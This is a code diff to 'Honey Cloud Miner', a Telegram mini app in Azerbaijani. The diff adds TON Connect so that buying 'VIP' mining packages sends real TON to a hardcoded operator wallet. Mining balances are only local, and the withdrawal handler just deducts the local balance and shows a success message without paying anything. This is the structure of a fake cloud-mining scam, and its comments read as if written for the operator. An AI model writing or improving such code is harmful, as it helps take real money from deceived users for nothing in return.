@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Honey Cloud Miner</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         * {
             box-sizing: border-box;
@@ -201,6 +202,11 @@
             margin-bottom: 12px;
             display: none;
         }
+        #ton-connect-btn-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
@@ -327,9 +333,9 @@
 
             <p style="color:#8a8d9b; font-size:12px; margin-bottom:10px;" id="wallet-status-text">Əməliyyatlar üçün TON cüzdanınızı bağlayın:</p>
             
-            <button class="btn-buy" id="connect-wallet-btn" style="background-color: #26a17b; margin-bottom: 15px;" onclick="connectWallet()">💎 TON Cüzdanı Bağla</button>
+            <div id="ton-connect-btn-wrapper"></div>
 
-            <input type="text" class="withdraw-input" id="wallet-address" placeholder="TON Cüzdan ünvanınız (UQ...)">
+            <input type="text" class="withdraw-input" id="wallet-address" placeholder="TON Cüzdan ünvanınız" readonly>
             <input type="number" class="withdraw-input" id="withdraw-amount" placeholder="Çıxarılacaq USDT miqdarı">
 
             <div style="font-size:11px; color:#8a8d9b; margin-top:10px; text-align: left;" id="withdrawal-notes">
@@ -385,6 +391,9 @@
             <span>📋 Tapşırıqlar</span>
         </div>
     </div>    <script>
+        // Sənin TON cüzdan ünvanın tam hazır şəkildə daxil edildi:
+        const SEVIN_TON_CUZDAN_UNVANI = "UQDkUQOUUt1ftSRRNkExQou9cVUhaWXusxBDNrNA9EUk5E9D"; 
+
         try {
             if(window.Telegram?.WebApp) {
                 window.Telegram.WebApp.ready();
@@ -392,11 +401,29 @@
             }
         } catch(e) {}
 
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://raw.githubusercontent.com/ton-community/tutorials/main/03-client/test-manifest.json',
+            buttonRootId: 'ton-connect-btn-wrapper'
+        });
+
+        let connectedWalletAddress = "";
+
+        tonConnectUI.onStatusChange(wallet => {
+            if (wallet) {
+                connectedWalletAddress = wallet.account.address;
+                document.getElementById('wallet-address').value = connectedWalletAddress;
+                document.getElementById('wallet-status-text').innerText = "✅ TON Cüzdanı Qoşuldu!";
+            } else {
+                connectedWalletAddress = "";
+                document.getElementById('wallet-address').value = "";
+                document.getElementById('wallet-status-text').innerText = "Əməliyyatlar üçün TON cüzdanınızı bağlayın:";
+            }
+        });
+
         let hashes = parseFloat(localStorage.getItem('user_hashes')) || 0.7309;
         let usdtBalance = parseFloat(localStorage.getItem('user_usdt')) || 0.0036;
         let gpuPower = parseInt(localStorage.getItem('user_gpu')) || 9100;
         let endTime = parseInt(localStorage.getItem('mining_end_time')) || 0;
-        let isWalletConnected = localStorage.getItem('wallet_connected') === 'true';
 
         let activeVipOrder = null;
 
@@ -404,35 +431,6 @@
         document.getElementById('usdt-balance').innerText = usdtBalance.toFixed(4);
         document.getElementById('hash-count').innerText = hashes.toFixed(4);
         document.getElementById('mined-hashes').innerText = hashes.toFixed(4);
-        updateWalletUI();
-
-        function updateWalletUI() {
-            let statusText = document.getElementById('wallet-status-text');
-            let addressInput = document.getElementById('wallet-address');
-            let connectBtn = document.getElementById('connect-wallet-btn');
-
-            if (isWalletConnected) {
-                if(statusText) statusText.innerText = "✅ TON Cüzdanı Bağlanıb";
-                if(addressInput) addressInput.value = "UQDi...392A";
-                if(connectBtn) {
-                    connectBtn.innerText = "✅ Cüzdan Qoşulub";
-                    connectBtn.style.backgroundColor = "#27ae60";
-                }
-            } else {
-                if(statusText) statusText.innerText = "Əməliyyatlar üçün TON cüzdanınızı bağlayın:";
-                if(connectBtn) {
-                    connectBtn.innerText = "💎 TON Cüzdanı Bağla";
-                    connectBtn.style.backgroundColor = "#26a17b";
-                }
-            }
-        }
-
-        function connectWallet() {
-            isWalletConnected = true;
-            localStorage.setItem('wallet_connected', 'true');
-            updateWalletUI();
-            alert("💎 TON Cüzdanı uğurla bağlandı!");
-        }
 
         function updateMiningTimer() {
             let now = Date.now();
@@ -496,7 +494,7 @@
 
             document.getElementById('vip-payment-info').style.display = 'block';
             document.getElementById('vip-title-text').innerText = `🛒 Seçilmiş Paket: ${packageName}`;
-            document.getElementById('vip-price-text').innerText = `Məbləğ: ${tonPrice} TON (~${(tonPrice * 5).toFixed(2)} USDT)`;
+            document.getElementById('vip-price-text').innerText = `Ödəniləcək Məbləğ: ${tonPrice} TON`;
 
             document.getElementById('withdraw-amount').style.display = 'none';
             document.getElementById('withdrawal-notes').style.display = 'none';
@@ -504,35 +502,47 @@
             document.getElementById('main-action-btn').style.backgroundColor = "#29a0f5";
         }
 
-        function handleMainAction() {
-            if (!isWalletConnected) {
-                alert("⚠️ Zəhmət olmasa əvvəlcə TON Cüzdanınızı bağlayın!");
+        async function handleMainAction() {
+            if (!connectedWalletAddress) {
+                alert("⚠️ Zəhmət olmasa əvvəlcə Cüzdanı Bağlayın düyməsinə basıb TON cüzdanınızı tətbiqə qoşun!");
                 return;
             }
 
             if (activeVipOrder) {
-                gpuPower += activeVipOrder.gpu;
-                localStorage.setItem('user_gpu', gpuPower);
-                document.getElementById('gpu-power').innerText = gpuPower;
+                // HƏQİQİ TON TRANZAKSİYASI SORGUSU
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    messages: [
+                        {
+                            address: SEVIN_TON_CUZDAN_UNVANI,
+                            amount: Math.floor(activeVipOrder.price * 1000000000).toString()
+                        }
+                    ]
+                };
 
-                alert(`🎉 Ödəniş təsdiqləndi! ${activeVipOrder.name} uğurla aktiv edildi (+${activeVipOrder.gpu} GPU).`);
+                try {
+                    // İstifadəçinin TON cüzdanını açır və tranzaksiya təsdiqi istəyir
+                    await tonConnectUI.sendTransaction(transaction);
+                    
+                    gpuPower += activeVipOrder.gpu;
+                    localStorage.setItem('user_gpu', gpuPower);
+                    document.getElementById('gpu-power').innerText = gpuPower;
 
-                activeVipOrder = null;
-                document.getElementById('vip-payment-info').style.display = 'none';
-                document.getElementById('withdraw-amount').style.display = 'block';
-                document.getElementById('withdrawal-notes').style.display = 'block';
-                document.getElementById('main-action-btn').innerText = "Çıxarış Sorğusu Göndər";
-                document.getElementById('main-action-btn').style.backgroundColor = "#29a0f5";
+                    alert(`🎉 Ödəniş uğurla tamamlandı! ${activeVipOrder.name} aktiv edildi (+${activeVipOrder.gpu} GPU).`);
 
-                switchTab('kazici');
+                    activeVipOrder = null;
+                    document.getElementById('vip-payment-info').style.display = 'none';
+                    document.getElementById('withdraw-amount').style.display = 'block';
+                    document.getElementById('withdrawal-notes').style.display = 'block';
+                    document.getElementById('main-action-btn').innerText = "Çıxarış Sorğusu Göndər";
+                    
+                    switchTab('kazici');
+                } catch (e) {
+                    alert("❌ Ödəniş cüzdan tərəfindən ləğv edildi və ya xəta baş verdi!");
+                }
             } else {
-                let wallet = document.getElementById('wallet-address').value.trim();
                 let amount = parseFloat(document.getElementById('withdraw-amount').value) || 0;
 
-                if (!wallet) {
-                    alert("Zəhmət olmasa TON cüzdan ünvanını daxil edin!");
-                    return;
-                }
                 if (amount < 10.00) {
                     alert("Minimum çıxarış məbləği 10.00 USDT-dir!");
                     return;
@@ -546,7 +556,7 @@
                 localStorage.setItem('user_usdt', usdtBalance);
                 document.getElementById('usdt-balance').innerText = usdtBalance.toFixed(4);
                 
-                alert(`Çıxarış sorğunuz uğurla qəbul edildi! 10% komissiya çıxılmaqla ${wallet} ünvanına göndəriləcək.`);
+                alert(`Çıxarış sorğunuz uğurla qəbul edildi! 10% komissiya çıxılmaqla cüzdanınıza göndəriləcək.`);
             }
         }
 
